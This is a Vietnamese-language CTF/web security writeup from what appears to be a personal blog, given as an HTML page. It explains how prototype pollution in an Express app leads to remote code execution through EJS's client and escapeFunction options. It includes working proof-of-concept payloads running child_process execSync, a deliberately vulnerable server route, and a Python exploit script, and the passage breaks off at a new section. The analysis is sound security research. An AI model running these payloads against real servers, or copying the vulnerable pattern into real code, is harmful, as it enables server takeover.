@@ -1,0 +1,1280 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='https://3HLD.github.io/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+
+    <title>Some note on Prototype pollution to RCE - 3HLD</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="3HLD" />
+    
+
+    
+        <meta property="og:title" content="Some note on Prototype pollution to RCE" />
+<meta property="og:description" content="DEEP DOWN TO EJS Example usage : Đơn giản như sau thui : const ejs = require(&quot;ejs&quot;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &quot;12113awefeaw&quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta cùng đọc qua về hàm render :
+exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://3HLD.github.io/writeups/pp2rce/" /><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2025-06-23T18:30:32+02:00" />
+<meta property="article:modified_time" content="2025-06-23T18:30:32+02:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Some note on Prototype pollution to RCE"/>
+<meta name="twitter:description" content="DEEP DOWN TO EJS Example usage : Đơn giản như sau thui : const ejs = require(&quot;ejs&quot;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &quot;12113awefeaw&quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta cùng đọc qua về hàm render :
+exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments."/>
+
+    <link rel="stylesheet" href="/style.min.8053497bc6198f3358c801e5f03064d80ce7571fb629f13b737c35a0c04824e23c691661d258553b83fb8b0d4ddc67f6f03ef7690f069b4d52e1d2a6c273c789.css" integrity="sha512-gFNJe8YZjzNYyAHl8DBk2AznVx&#43;2KfE7c3w1oMBIJOI8aRZh0lhVO4P7iw1N3Gf28D73aQ8Gm01S4dKmwnPHiQ==">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.min.6226f06f992e0d6166b0e26724efd050dcc381202a752892ba523b1b865de2ea5e427f8f7d10de682fc35d6e7444018247d1f25db5e1e3bab17068ce191c5886.css" integrity="sha512-Yibwb5kuDWFmsOJnJO/QUNzDgSAqdSiSulI7G4Zd4upeQn&#43;PfRDeaC/DXW50RAGCR9HyXbXh47qxcGjOGRxYhg==">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.64a5d751579791aca02cca13ec10c056a8bb0de07cc69a70f0ef401bb0f470f2360e07f1f6f4398e0681f9abd2c64b3cb9d167ee471fa2a07bb1943e06e0c02b.js" integrity="sha512-ZKXXUVeXkaygLMoT7BDAVqi7DeB8xppw8O9AG7D0cPI2Dgfx9vQ5jgaB&#43;avSxks8udFn7kcfoqB7sZQ&#43;BuDAKw=="></script>
+
+
+
+    <script defer src="/js/zooming.684b5d075bf94d0adfa21a7e7eb9acec1ddfb2e7b47d6657981617f0db0cf50949f1172801595afa3051f51b28d67f6a2d0c41be677b59b564307d9dbe4a4fd2.js" integrity="sha512-aEtdB1v5TQrfohp&#43;frms7B3fsue0fWZXmBYX8NsM9QlJ8RcoAVla&#43;jBR9Rso1n9qLQxBvmd7WbVkMH2dvkpP0g=="></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.ea52843de9ef49f2fd5ada5a4e0efb81dd05ae250cb815846dfa3fb988498c70ae2cc567a635da79ffd407054622cea929e1b5fa00977f69c48e373b728cb9cd.js" integrity="sha512-6lKEPenvSfL9WtpaTg77gd0FriUMuBWEbfo/uYhJjHCuLMVnpjXaef/UBwVGIs6pKeG1&#43;gCXf2nEjjc7coy5zQ==" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.8cd463f33435ae60ec235d29b551a78c4fe834221c0da357bbd082f8584f212d43268611418f29d0da8924e5e721a591bf7d52850ae19e0ba9c7e39626bb9620.js" integrity="sha512-jNRj8zQ1rmDsI10ptVGnjE/oNCIcDaNXu9CC&#43;FhPIS1DJoYRQY8p0NqJJOXnIaWRv31ShQrhngupx&#43;OWJruWIA=="></script>
+
+
+
+
+<link rel="stylesheet" href="https://3HLD.github.io/user.css">
+
+    
+
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">3HLD</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#prototype-pollution-to-rce-">Prototype pollution to RCE .</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#poc-">POC :</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#poc--1">POC :</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#constructorprototype-">Constructor.prototype :</a></li>
+    <li><a href="#__proto__">__proto__</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">CTF</div>
+
+  
+    <div class="badge">Web</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Jun 23, 2025
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    
+<h1 id="deep-down-to-ejs" class="header-anchor-wrapper">DEEP DOWN TO EJS
+  <a href="#deep-down-to-ejs" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+
+<h1 id="example-usage-" class="header-anchor-wrapper">Example usage :
+  <a href="#example-usage-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Đơn giản như sau thui :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">    const ejs = require(&quot;ejs&quot;)
+    const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
+    ejs.clearCache();
+    const data = { name: &quot;12113awefeaw&quot; }
+    const compiled = ejs.render(template, data, {}); 
+    console.log(compiled.toString())
+</code></pre>
+
+<h1 id="how-ejs-works" class="header-anchor-wrapper">How ejs works
+  <a href="#how-ejs-works" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p>Ta cùng đọc qua về hàm render :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">
+      exports.render = function (template, d, o) {
+        var data = d || utils.createNullProtoObjWherePossible();
+        var opts = o || utils.createNullProtoObjWherePossible();
+
+        // No options object -- if there are optiony names
+        // in the data, copy them to options
+        if (arguments.length == 2) {
+          utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
+        }
+
+        return handleCache(opts, template)(data);
+      };
+</code></pre>
+<ul>
+<li>Hàm nhận vào data và options .</li>
+<li>Nếu không có options thì kiểu tra data xem có key nào có thể cho vào OPTIONS hay không theo danh sách trên :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
+'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
+</code></pre>
+<ul>
+<li>Sau đó gọi hàm handleCache nhận về một function và cho data làm đối số. Vậy ta sẽ phải tìm hiểu hàm handleCache sẽ trả về function gì .</li>
+</ul>
+<p>handleCache :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">
+      function handleCache(options, template) {
+        var func;
+        var filename = options.filename;
+        var hasTemplate = arguments.length &gt; 1;
+
+        if (options.cache) {
+          if (!filename) {
+            throw new Error('cache option requires a filename');
+          }
+          func = exports.cache.get(filename);
+          if (func) {
+            return func;
+          }
+          if (!hasTemplate) {
+            template = fileLoader(filename).toString().replace(_BOM, '');
+          }
+        }
+        else if (!hasTemplate) {
+          // istanbul ignore if: should not happen at all
+          if (!filename) {
+            throw new Error('Internal EJS error: no file name or template '
+              + 'provided');
+          }
+          template = fileLoader(filename).toString().replace(_BOM, '');
+        }
+        func = exports.compile(template, options);
+        if (options.cache) {
+          exports.cache.set(filename, func);
+        }
+        return func;
+      }
+</code></pre>
+<ul>
+<li>Trước hết nó sẽ kiểm tra options cache xem có hay không sau đó sẽ dùng filename đó đưa vào hàm cache.get(filename) để nhận về một function thứ mà ta có thể đưa data vào để nhận được template cuối cùng.</li>
+<li>Trường hợp không có cache thì sẽ dùng hàm <strong>compile</strong> với template và options được truyền vào.</li>
+</ul>
+<p>compile function  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">
+      exports.compile = function compile(template, opts) {
+        var templ;
+
+        // v1 compat
+        // 'scope' is 'context'
+        // FIXME: Remove this in a future version
+        if (opts &amp;&amp; opts.scope) {
+          if (!scopeOptionWarned) {
+            console.warn('`scope` option is deprecated and will be removed in EJS 3');
+            scopeOptionWarned = true;
+          }
+          if (!opts.context) {
+            opts.context = opts.scope;
+          }
+          delete opts.scope;
+        }
+        templ = new Template(template, opts);
+        return templ.compile();
+      };
+</code></pre>
+<ul>
+<li>Tạo một Object template và trả về kết quả sau khi gọi hàm templ.compile()</li>
+<li>Class Template khá lớn nên mình sẽ tập trung vào hàm compile của nó . Hàm compile này là core function để tạo nên một function sẽ nhận data và trả về template.</li>
+<li>Trước khi đọc các giai đoạn nó tạo ra hàm thì ta có thể đơn giản là log hàm đó ra :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(data) {
+      var include = function (path, includeData) {
+        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
+        if (includeData) {
+          d = utils.shallowCopy(d, includeData);
+        }
+        return includeFile(path, opts)(d);
+      };
+      return fn.apply(opts.context,
+        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
+    }
+</code></pre>
+<ul>
+<li>Copy data các kiểu xong sẽ dùng hàm fn.apply vậy ta cần biết fn ở đây là hàm gì . Đọc source ta có thẻ thấy đoạn sau  :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">    var returnedFn = opts.client ? fn : function anonymous(data) {
+      var include = function (path, includeData) {
+        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
+        if (includeData) {
+          d = utils.shallowCopy(d, includeData);
+        }
+        return includeFile(path, opts)(d);
+      };
+      console.log(fn.toString())
+      return fn.apply(opts.context,
+        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
+    };
+</code></pre>
+<ul>
+<li>Với options.client =0 thì ta sẽ nhận được hàm trên và fn ở đây sau khi log ra thì ta có  :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(locals, escapeFn, include, rethrow
+) {
+var __line = 1
+  , __lines = &quot;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&quot;
+  , __filename = undefined;
+try {
+  var __output = &quot;&quot;;
+  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }
+  with (locals || {}) {
+    ; __append(&quot;&lt;h1&gt;Hello &quot;)
+    ; __append(escapeFn( name ))
+    ; __append(&quot;&lt;/h1&gt;&quot;)
+  }
+  return __output;
+} catch (e) {
+  rethrow(e, __lines, __filename, __line, escapeFn);
+}
+
+}
+</code></pre>
+<ul>
+<li>Đến đây ta hoàn toàn có thể thấy được logic mà name được đưa vào template. Khá phức tạp ở đây nhưng ta sẽ tiếp tục đọc vào hàm này.</li>
+<li>Đây là source generate được đống function trên bằng cách ghép nhiều chuỗi với nhau</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">
+    if (!this.source) {
+      this.generateSource();
+      prepended +=
+        '  var __output = &quot;&quot;;\n' +
+        '  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n';
+      if (opts.outputFunctionName) {
+        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
+          throw new Error('outputFunctionName is not a valid JS identifier.');
+        }
+        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
+      }
+      if (opts.localsName &amp;&amp; !_JS_IDENTIFIER.test(opts.localsName)) {
+        throw new Error('localsName is not a valid JS identifier.');
+      }
+      if (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) {
+        var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
+        for (var i = 0; i &lt; opts.destructuredLocals.length; i++) {
+          var name = opts.destructuredLocals[i];
+          if (!_JS_IDENTIFIER.test(name)) {
+            throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.');
+          }
+          if (i &gt; 0) {
+            destructuring += ',\n  ';
+          }
+          destructuring += name + ' = __locals.' + name;
+        }
+        prepended += destructuring + ';\n';
+      }
+      if (opts._with !== false) {
+        prepended += '  with (' + opts.localsName + ' || {}) {' + '\n';
+        appended += '  }' + '\n';
+      }
+      appended += '  return __output;' + '\n';
+      this.source = prepended + this.source + appended;
+    }
+
+    if (opts.compileDebug) {
+      src = 'var __line = 1' + '\n'
+        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
+        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
+        + 'try {' + '\n'
+        + this.source
+        + '} catch (e) {' + '\n'
+        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
+        + '}' + '\n';
+    }
+    else {
+      src = this.source;
+    }
+
+    if (opts.client) {
+      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+      if (opts.compileDebug) {
+        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
+      }
+    }
+
+    if (opts.strict) {
+      src = '&quot;use strict&quot;;\n' + src;
+    }
+    if (opts.debug) {
+      console.log(src);
+    }
+    if (opts.compileDebug &amp;&amp; opts.filename) {
+      src = src + '\n'
+        + '//# sourceURL=' + sanitizedFilename + '\n';
+    }
+</code></pre>
+<ul>
+<li>Đến đây ta đã biết rằng hàm sau sẽ được execute và hàm được tạo bởi các string ghép lại ? Vậy sẽ thế nào nếu ta có thẻ input tùy ý vào hàm này qua options của ejs? Từ đó lấy RCE ? Ta sẽ đi tìm một vài điểm nào đó có thể cho ta input vào . Nhìn sơ ta có thể thấy</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">      if (opts.outputFunctionName) {
+        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
+          throw new Error('outputFunctionName is not a valid JS identifier.');
+        }
+        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
+      }
+</code></pre>
+<p>Nhưng vì có regrex khá căng nên cũng không khả thi lắm. Riêng chỉ có đoạn này :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">    if (opts.client) {
+      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+      if (opts.compileDebug) {
+        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
+      }
+    }
+</code></pre>
+<p>Well cả 2 biến client và escapeFn đều được lấy từ options object vào ? Sẽ ra sao nếu ta split javascript code với &ldquo;;&rdquo; và chèn rce code vào ?</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
+const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
+escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
+const data = { name: &quot;12113awefeaw&quot; }
+const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works 
+console.log(compiled.toString())
+</code></pre>
+<p>Khi này function sau sẽ được generate ra :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(locals, escapeFn, include, rethrow
+) {
+rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) {
+  var lines = str.split('\n');
+  var start = Math.max(lineno - 3, 0);
+  var end = Math.min(lines.length, lineno + 3);
+  var filename = esc(flnm);
+  // Error context
+  var context = lines.slice(start, end).map(function (line, i) {
+    var curr = i + start + 1;
+    return (curr == lineno ? ' &gt;&gt; ' : '    ')
+      + curr
+      + '| '
+      + line;
+  }).join('\n');
+
+  // Alter exception message
+  err.path = filename;
+  err.message = (filename || 'ejs') + ':'
+    + lineno + '\n'
+    + context + '\n\n'
+    + err.message;
+
+  throw err;
+};
+    /*OUR OPTIONS GOES IN HERE */
+escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
+var __line = 1
+  , __lines = &quot;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&quot;
+  , __filename = undefined;
+try {
+  var __output = &quot;&quot;;
+  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }
+  with (locals || {}) {
+    ; __append(&quot;&lt;h1&gt;Hello &quot;)
+    ; __append(escapeFn( name ))
+    ; __append(&quot;&lt;/h1&gt;&quot;)
+  }
+  return __output;
+} catch (e) {
+  rethrow(e, __lines, __filename, __line, escapeFn);
+}
+
+}
+</code></pre>
+<p>Và ta đã có thể chạy bất kì js command nào !!!</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
+</code></pre>
+<p><img alt="image" src="https://hackmd.io/_uploads/HyQcobyOxg.png"></p>
+
+<h2 id="prototype-pollution-to-rce-" class="header-anchor-wrapper">Prototype pollution to RCE .
+  <a href="#prototype-pollution-to-rce-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Nhưng trong thực tế ta sẽ không kiểm soát được options được chèn vào . Vậy sẽ ra sao nếu ta có một prototype pollution ở phía server ? Test với đoạn code sau  :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
+const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
+ejs.clearCache();
+escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
+Object.prototype.client = true
+Object.prototype.escapeFunction = escapeFunction
+const data = { name: &quot;12113awefeaw&quot; }
+const compiled = ejs.render(template, data); // not works 
+console.log(compiled.toString())
+
+</code></pre>
+<p>Hmmmm , ta thấy không có gì xảy ra cả vì nếu để ý từ đầu đoạn code đã có một phần check rất rõ  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">      exports.render = function (template, d, o) {
+        var data = d || utils.createNullProtoObjWherePossible();
+        var opts = o || utils.createNullProtoObjWherePossible();
+      }
+</code></pre>
+<p>Điều này đã block việc protoytpe pollution nhưng có một vấn đề là nhiều project ở ngoài kia sẽ không bao giờ để trống options field và đơn giản sẽ truyền vào đó một <strong>empty object</strong> ~ ~!! chính điều này là root cause cho việc bypass này , để simluate ta đơn giản chỉ cần truyền {} vào là đc .</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
+const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
+ejs.clearCache();
+escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
+Object.prototype.client = true
+Object.prototype.escapeFunction = escapeFunction
+const data = { name: &quot;12113awefeaw&quot; }
+const compiled = ejs.render(template, data, {}); // works now with polluted {}
+console.log(compiled.toString())
+</code></pre>
+<ul>
+<li>Tèn ten , điều này hoạt động vì hàm render sẽ ưu tiên nhận object từ ngoài vào.
+<img alt="image" src="https://hackmd.io/_uploads/ByAHKC-Ole.png"></li>
+</ul>
+
+<h1 id="express-js" class="header-anchor-wrapper">Express js
+  <a href="#express-js" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<ul>
+<li>Để kiểm chứng việc truyền object trống vào options ta có thể xem sơ qua source của express js ta sẽ thấy đoạn sau  :
+<img alt="image" src="https://hackmd.io/_uploads/BkWcAZyueg.png">
+Vì luôn có options object nên Express default cũng có thể bị lỗi này .</li>
+</ul>
+
+<h3 id="poc-" class="header-anchor-wrapper">POC :
+  <a href="#poc-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>Server.js :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express');
+const path = require('path');
+
+const bodyParser = require('body-parser');
+
+const app = express();
+app.use(bodyParser.json());
+
+
+// Set EJS as the template engine
+app.set('view engine', 'ejs');
+
+// Set the views directory
+app.set('views', path.join(__dirname, 'views'));
+
+app.post(&quot;/pollute_me&quot;, (req, res) =&gt; {
+    // Prototype pollution vulnerability here
+    Object.assign(Object.prototype, req.body);
+    console.log({}.client)
+    res.send('Updated!');
+})
+// Define a simple route
+app.get('/', (req, res) =&gt; {
+    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
+});
+
+// Start the server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () =&gt; {
+    console.log(`Server running on http://localhost:${PORT}`);
+});
+
+</code></pre>
+<p>ex.py  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-py">import  requests
+url = &quot;http://localhost:3000&quot;
+escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
+data  = { 
+        &quot;client&quot; : '123' ,
+        &quot;escapeFunction&quot; : escapeFunction
+}
+res = requests.post(url+'/pollute_me' ,json=data)
+print(res.text)
+requests.get(url)
+
+</code></pre>
+<p><em>Express views use a default config when calling templating function, which make it vulnerable by default!</em></p>
+
+<h1 id="another-gadget-" class="header-anchor-wrapper">Another gadget :
+  <a href="#another-gadget-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
